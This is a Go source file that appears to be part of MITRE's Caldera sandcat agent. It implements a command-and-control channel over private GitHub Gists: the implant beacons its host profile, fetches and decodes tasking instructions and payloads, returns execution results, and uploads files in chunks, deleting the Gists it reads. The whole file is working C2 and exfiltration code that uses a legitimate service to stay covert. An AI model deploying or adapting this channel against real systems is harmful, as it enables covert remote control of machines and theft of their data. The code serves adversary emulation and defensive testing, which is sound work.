package contact

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"strconv"
	"time"

	"github.com/mitre/gocat/output"

	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
	beaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
	maxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
)

var (
	token = ""
	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	username string
)

type GIST struct {
	name string
}

func init() {
	CommunicationChannels["GIST"] = GIST{ name: "GIST" }
}

//GetInstructions sends a beacon and returns instructions
func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
	checkValidSleepInterval(profile)
	var retBytes []byte
	bites, heartbeat := gistBeacon(profile)
	if heartbeat == true {
		retBytes = bites
	}
	return retBytes
}

//GetPayloadBytes load payload bytes from github
func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
	var err error
	if _, ok := profile["paw"]; !ok {
		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
		return nil, ""
	}
	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
	if payloads[0] != "" {
		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
			return nil, ""
		}
	}
	return payloadBytes, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
    if len(criteria["c2Key"]) > 0 {
        token = criteria["c2Key"]
        if len(profile["paw"].(string)) == 0 {
        	config["paw"] = getBeaconNameIdentifier()
        }
        return true, config
    }
    return false, nil
}

func (g GIST) SetUpstreamDestAddr(upstreamDestAddr string) {
	// Upstream destination will be the github API.
	return
}

//SendExecutionResults send results to the server
func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	gistResults(profileCopy)
}

func (g GIST) GetName() string {
	return g.name
}

func (g GIST) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
	paw := profile["paw"].(string)

	// Upload file in chunks
	uploadId := getNewUploadId()
	dataSize := len(data)
	numChunks := int(math.Ceil(float64(dataSize) / float64(maxDataChunkSize)))
	start := 0
	gistName := getGistNameForUpload(paw)
	for i := 0; i < numChunks; i++ {
		end := start + maxDataChunkSize
		if end > dataSize {
			end = dataSize
		}
		chunk := data[start:end]
		gistDescription := getGistDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
		if err := uploadFileChunk(gistName, gistDescription, chunk); err != nil {
			return err
		}
		start += maxDataChunkSize
	}
	return nil
}

func getGistNameForUpload(paw string) string {
	return getGistDescriptor("upload", paw)
}

func getGistDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
}

func uploadFileChunk(gistName string, gistDescription string, data []byte) error {
	if result := createGist(gistName, gistDescription, data); result != created {
		return errors.New(fmt.Sprintf("Failed to create file upload GIST. Response code: %d", result))
	}
	return nil
}

func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	failCount := 0
	heartbeat := createHeartbeatGist("beacon", profile)
	if heartbeat {
		//collect instructions & delete
		for failCount < beaconResponseFailThreshold {
			contents := getGists("instructions", profile["paw"].(string));
			if contents != nil {
				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
				if err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
					return nil, heartbeat
				}
				return decodedContents, heartbeat
			}
			// Wait for C2 server to provide instruction response gist.
			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
			failCount += 1
		}
		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
	}
	return nil, heartbeat
}

func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist heartbeat. Error with profile marshal: %s", err.Error()))
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	} else {
		paw := profile["paw"].(string)
		gistName := getGistDescriptor(gistType, paw)
		gistDescription := gistName
		if createGist(gistName, gistDescription, data) != created {
			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
			return false
		}
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func gistResults(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
		output.VerbosePrint("[-] Results GIST: FAILED")
	} else {
		paw := result["paw"].(string)
		gistName := getGistDescriptor("results", paw)
		gistDescription := gistName
		if createGist(gistName, gistDescription, data) != created {
			output.VerbosePrint("[-] Results GIST: FAILED")
		} else {
			output.VerbosePrint("[+] Results GIST: SUCCESS")
		}
	}
}


func createGist(gistName string, description string, data []byte) int {
	ctx := context.Background()
	c2Client := createNewClient()
	stringified := base64.StdEncoding.EncodeToString(data)
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistName)] = file
	public := false
	gist := github.Gist{Description: &description, Public: &public, Files: files,}
	_, resp, err := c2Client.Gists.Create(ctx, &gist)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error creating GIST: %s", err.Error()))
		return githubError
	}
	return resp.StatusCode
}

func getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	c2Client := createNewClient()
	var contents []string
	gists, _, err := c2Client.Gists.List(ctx, username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				c2Client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func getGistDescriptor(gistType string, uniqueId string) string {
	return fmt.Sprintf("%s-%s", gistType, uniqueId)
}

func checkValidSleepInterval(profile map[string]interface{}) {
	if profile["sleep"] == githubTimeout{
		time.Sleep(time.Duration(float64(githubTimeoutResetInterval)) * time.Second)
	}
}

func getBeaconNameIdentifier() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}

func createNewClient() *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	c2Client := github.NewClient(tc)
	return c2Client
}

func getNewUploadId() string {
	rand.Seed(time.Now().UnixNano())
	return strconv.Itoa(rand.Int())
}